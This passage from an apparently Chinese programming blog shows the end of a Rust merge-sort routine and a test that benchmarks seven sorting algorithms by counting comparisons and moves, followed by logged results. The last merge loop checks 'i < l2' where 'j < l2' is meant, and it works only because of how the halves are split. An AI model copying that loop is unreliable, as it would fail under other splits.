punctuation">..</span>left <span class="token operator">+</span> l1<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">to_vec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> v2 <span class="token operator">=</span> nums<span class="token punctuation">[</span>mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">..</span>mid <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">+</span> l2<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">to_vec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token punctuation">(</span>l1 <span class="token operator">+</span> l2<span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">u64</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> k <span class="token operator">=</span> left<span class="token punctuation">;</span>        <span class="token keyword">while</span> i<span class="token operator">&lt;</span>l1 <span class="token operator">&amp;&amp;</span> j<span class="token operator">&lt;</span>l2<span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">compare</span><span class="token punctuation">(</span>v1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                j <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>                i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            k <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> l1<span class="token punctuation">&#123;</span>            nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            i <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            k <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> i <span class="token operator">&lt;</span> l2<span class="token punctuation">&#123;</span>            nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">self</span><span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            j <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>            k <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token attribute attr-name">#[cfg(test)]</span><span class="token keyword">mod</span> <span class="token module-declaration namespace">test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token punctuation">::</span><span class="token class-name">Sort</span><span class="token punctuation">;</span>    <span class="token attribute attr-name">#[test]</span>    <span class="token keyword">fn</span> <span class="token function-definition function">test_sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">use</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token class-name">Rng</span><span class="token punctuation">;</span>        <span class="token keyword">use</span> <span class="token namespace">tracing<span class="token punctuation">::</span></span>info<span class="token punctuation">;</span>        <span class="token keyword">use</span> <span class="token namespace">tracing_subscriber<span class="token punctuation">::</span>filter<span class="token punctuation">::</span></span><span class="token class-name">LevelFilter</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> _ <span class="token operator">=</span> <span class="token namespace">tracing_subscriber<span class="token punctuation">::</span></span><span class="token function">fmt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">with_max_level</span><span class="token punctuation">(</span><span class="token class-name">LevelFilter</span><span class="token punctuation">::</span><span class="token constant">INFO</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">with_test_writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token punctuation">.</span><span class="token function">try_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">let</span> <span class="token keyword">mut</span> rng <span class="token operator">=</span> <span class="token namespace">rand<span class="token punctuation">::</span></span><span class="token function">rng</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 定义5组测试数据的长度</span>        <span class="token keyword">let</span> test_sizes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">,</span> <span class="token number">10000</span><span class="token punctuation">,</span> <span class="token number">100000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>round<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span> <span class="token keyword">in</span> test_sizes<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token macro property">info!</span><span class="token punctuation">(</span><span class="token string">"=== 第 &#123;&#125; 组测试 | 数据量: &#123;&#125; ==="</span><span class="token punctuation">,</span> round <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 生成随机数据</span>            <span class="token keyword">let</span> origin<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">..</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>_<span class="token closure-punctuation punctuation">|</span></span> rng<span class="token punctuation">.</span><span class="token function">random_range</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">10000</span><span class="token punctuation">..</span><span class="token number">10000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">let</span> sorted_std <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> <span class="token keyword">mut</span> v <span class="token operator">=</span> origin<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                v<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                v            <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>            <span class="token comment">// 定义算法列表：(名称, 执行闭包)</span>            <span class="token comment">// 使用 Box&lt;dyn Fn...> 来统一不同函数签名的调用</span>            <span class="token keyword">let</span> algorithms<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token operator">&lt;</span><span class="token keyword">dyn</span> <span class="token class-name">Fn</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Sort</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">i32</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>                <span class="token punctuation">(</span><span class="token string">"插入排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">insert_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">"希尔排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">shell_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">"冒泡排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">bubble_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">"选择排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">select_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">"堆排序  "</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> s<span class="token punctuation">.</span><span class="token function">heap_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">"快速排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">let</span> l <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> l <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span> s<span class="token punctuation">.</span><span class="token function">quick_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span><span class="token string">"归并排序"</span><span class="token punctuation">,</span> <span class="token class-name">Box</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>s<span class="token punctuation">,</span> v<span class="token closure-punctuation punctuation">|</span></span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">let</span> l <span class="token operator">=</span> v<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span> l <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">&#123;</span> s<span class="token punctuation">.</span><span class="token function">merge_sort</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span> func<span class="token punctuation">)</span> <span class="token keyword">in</span> algorithms <span class="token punctuation">&#123;</span>                <span class="token keyword">let</span> <span class="token keyword">mut</span> data <span class="token operator">=</span> origin<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">let</span> <span class="token keyword">mut</span> sort_instance <span class="token operator">=</span> <span class="token class-name">Sort</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 每次新建实例</span>                <span class="token comment">// 执行排序</span>                <span class="token function">func</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> sort_instance<span class="token punctuation">,</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 验证结果 (使用标准库排序结果作为基准)</span>                <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> sorted_std<span class="token punctuation">,</span> <span class="token string">"&#123;&#125; 结果不正确!"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 打印结果 (格式化对齐)</span>                <span class="token macro property">info!</span><span class="token punctuation">(</span>                    <span class="token string">"算法: &#123;&#125; | 比较: &#123;:>9&#125; | 移动: &#123;:>9&#125;"</span><span class="token punctuation">,</span>                    name<span class="token punctuation">,</span>                    sort_instance<span class="token punctuation">.</span>bench<span class="token punctuation">.</span>compare_time<span class="token punctuation">,</span>                    sort_instance<span class="token punctuation">.</span>bench<span class="token punctuation">.</span>move_time                <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/*    fn verify_sort(num : Vec&lt;i32>, sorted : Vec&lt;i32>) -> Result&lt;(), String>&#123;        if num.len() != sorted.len() &#123;            return Err("长度不相等".to_string());        &#125;        // 检查排序后的数组是否有序        for i in 1..sorted.len() &#123;            if sorted[i] &lt; sorted[i - 1] &#123;                return Err("排序后数组存在逆序".to_string());            &#125;        &#125;        // 检查两个数组是否包含相同的元素（顺序可以不同）        let mut num_sorted = num.clone();        num_sorted.sort();        if num_sorted == sorted &#123;           Ok(())        &#125;else&#123;            Err("数组不相等".to_string())        &#125;    &#125;    */</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">running <span class="token number">1</span> <span class="token builtin class-name">test</span><span class="token number">2025</span>-12-22T05:01:19.791577Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">1</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">100</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token number">2025</span>-12-22T05:01:19.792588Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较:    <span class="token number">2702</span> <span class="token operator">|</span> 移动:    <span class="token number">2609</span><span class="token number">2025</span>-12-22T05:01:19.793373Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:    <span class="token number">1145</span> <span class="token operator">|</span> 移动:     <span class="token number">781</span><span class="token number">2025</span>-12-22T05:01:19.794736Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较:    <span class="token number">4905</span> <span class="token operator">|</span> 移动:    <span class="token number">7536</span><span class="token number">2025</span>-12-22T05:01:19.796295Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较:    <span class="token number">4950</span> <span class="token operator">|</span> 移动:     <span class="token number">282</span><span class="token number">2025</span>-12-22T05:01:19.797076Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:    <span class="token number">1027</span> <span class="token operator">|</span> 移动:    <span class="token number">1746</span><span class="token number">2025</span>-12-22T05:01:19.797772Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:     <span class="token number">727</span> <span class="token operator">|</span> 移动:    <span class="token number">1095</span><span class="token number">2025</span>-12-22T05:01:19.798186Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:     <span class="token number">549</span> <span class="token operator">|</span> 移动:    <span class="token number">1292</span><span class="token number">2025</span>-12-22T05:01:19.798396Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">2</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">500</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token number">2025</span>-12-22T05:01:19.803050Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较:   <span class="token number">62463</span> <span class="token operator">|</span> 移动:   <span class="token number">61970</span><span class="token number">2025</span>-12-22T05:01:19.804701Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:   <span class="token number">13345</span> <span class="token operator">|</span> 移动:   <span class="token number">11392</span><span class="token number">2025</span>-12-22T05:01:19.818697Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较:  <span class="token number">124372</span> <span class="token operator">|</span> 移动:  <span class="token number">184407</span><span class="token number">2025</span>-12-22T05:01:19.821945Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较:  <span class="token number">124750</span> <span class="token operator">|</span> 移动:    <span class="token number">1485</span><span class="token number">2025</span>-12-22T05:01:19.822856Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:    <span class="token number">7440</span> <span class="token operator">|</span> 移动:   <span class="token number">12117</span><span class="token number">2025</span>-12-22T05:01:19.823920Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:    <span class="token number">5113</span> <span class="token operator">|</span> 移动:    <span class="token number">9120</span><span class="token number">2025</span>-12-22T05:01:19.824957Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:    <span class="token number">3856</span> <span class="token operator">|</span> 移动:    <span class="token number">8694</span><span class="token number">2025</span>-12-22T05:01:19.825448Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">3</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">1000</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token number">2025</span>-12-22T05:01:19.839718Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较:  <span class="token number">256070</span> <span class="token operator">|</span> 移动:  <span class="token number">255078</span><span class="token number">2025</span>-12-22T05:01:19.843516Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:   <span class="token number">54399</span> <span class="token operator">|</span> 移动:   <span class="token number">50467</span><span class="token number">2025</span>-12-22T05:01:19.879929Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较:  <span class="token number">498905</span> <span class="token operator">|</span> 移动:  <span class="token number">762174</span><span class="token number">2025</span>-12-22T05:01:19.891824Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较:  <span class="token number">499500</span> <span class="token operator">|</span> 移动:    <span class="token number">2982</span><span class="token number">2025</span>-12-22T05:01:19.894710Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:   <span class="token number">16804</span> <span class="token operator">|</span> 移动:   <span class="token number">27147</span><span class="token number">2025</span>-12-22T05:01:19.895870Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:   <span class="token number">10949</span> <span class="token operator">|</span> 移动:   <span class="token number">14496</span><span class="token number">2025</span>-12-22T05:01:19.897454Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:    <span class="token number">8709</span> <span class="token operator">|</span> 移动:   <span class="token number">19296</span><span class="token number">2025</span>-12-22T05:01:19.898132Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">4</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">2000</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token number">2025</span>-12-22T05:01:19.943426Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较:  <span class="token number">970591</span> <span class="token operator">|</span> 移动:  <span class="token number">968597</span><span class="token number">2025</span>-12-22T05:01:19.949645Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:  <span class="token number">156710</span> <span class="token operator">|</span> 移动:  <span class="token number">148767</span><span class="token number">2025</span>-12-22T05:01:20.075452Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较: <span class="token number">1998790</span> <span class="token operator">|</span> 移动: <span class="token number">2899533</span><span class="token number">2025</span>-12-22T05:01:20.126713Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较: <span class="token number">1999000</span> <span class="token operator">|</span> 移动:    <span class="token number">5973</span><span class="token number">2025</span>-12-22T05:01:20.129949Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:   <span class="token number">37755</span> <span class="token operator">|</span> 移动:   <span class="token number">60588</span><span class="token number">2025</span>-12-22T05:01:20.132023Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:   <span class="token number">25649</span> <span class="token operator">|</span> 移动:   <span class="token number">38115</span><span class="token number">2025</span>-12-22T05:01:20.134511Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:   <span class="token number">19412</span> <span class="token operator">|</span> 移动:   <span class="token number">42698</span><span class="token number">2025</span>-12-22T05:01:20.134763Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">5</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">5000</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token number">2025</span>-12-22T05:01:20.396978Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较: <span class="token number">6203283</span> <span class="token operator">|</span> 移动: <span class="token number">6198287</span><span class="token number">2025</span>-12-22T05:01:20.444421Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较:  <span class="token number">918591</span> <span class="token operator">|</span> 移动:  <span class="token number">898657</span><span class="token number">2025</span>-12-22T05:01:21.271658Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较: <span class="token number">12496639</span> <span class="token operator">|</span> 移动: <span class="token number">18577998</span><span class="token number">2025</span>-12-22T05:01:21.593931Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较: <span class="token number">12497500</span> <span class="token operator">|</span> 移动:   <span class="token number">14982</span><span class="token number">2025</span>-12-22T05:01:21.600998Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:  <span class="token number">107656</span> <span class="token operator">|</span> 移动:  <span class="token number">171342</span><span class="token number">2025</span>-12-22T05:01:21.605011Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:   <span class="token number">68277</span> <span class="token operator">|</span> 移动:  <span class="token number">100923</span><span class="token number">2025</span>-12-22T05:01:21.610876Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:   <span class="token number">55199</span> <span class="token operator">|</span> 移动:  <span class="token number">120893</span><span class="token number">2025</span>-12-22T05:01:21.611331Z  INFO ex7::test: <span class="token operator">==</span><span class="token operator">=</span> 第 <span class="token number">6</span> 组测试 <span class="token operator">|</span> 数据量: <span class="token number">10000</span> <span class="token operator">==</span><span class="token operator">=</span><span class="token number">2025</span>-12-22T05:01:22.675283Z  INFO ex7::test: 算法: 插入排序 <span class="token operator">|</span> 比较: <span class="token number">24842700</span> <span class="token operator">|</span> 移动: <span class="token number">24832712</span><span class="token number">2025</span>-12-22T05:01:22.817031Z  INFO ex7::test: 算法: 希尔排序 <span class="token operator">|</span> 比较: <span class="token number">3423814</span> <span class="token operator">|</span> 移动: <span class="token number">3383885</span><span class="token number">2025</span>-12-22T05:01:26.095848Z  INFO ex7::test: 算法: 冒泡排序 <span class="token operator">|</span> 比较: <span class="token number">49978529</span> <span class="token operator">|</span> 移动: <span class="token number">74460552</span><span class="token number">2025</span>-12-22T05:01:27.326666Z  INFO ex7::test: 算法: 选择排序 <span class="token operator">|</span> 比较: <span class="token number">49995000</span> <span class="token operator">|</span> 移动:   <span class="token number">29973</span><span class="token number">2025</span>-12-22T05:01:27.342937Z  INFO ex7::test: 算法: 堆排序   <span class="token operator">|</span> 比较:  <span class="token number">235350</span> <span class="token operator">|</span> 移动:  <span class="token number">372729</span><span class="token number">2025</span>-12-22T05:01:27.352162Z  INFO ex7::test: 算法: 快速排序 <span class="token operator">|</span> 比较:  <span class="token number">146882</span> <span class="token operator">|</span> 移动:  <span class="token number">225297</span><span class="token number">2025</span>-12-22T05:01:27.364114Z  INFO ex7::test: 算法: 归并排序 <span class="token operator">|</span> 比较:  <span class="token number">120507</span> <span class="token operator">|</span> 移动:  <span class="token 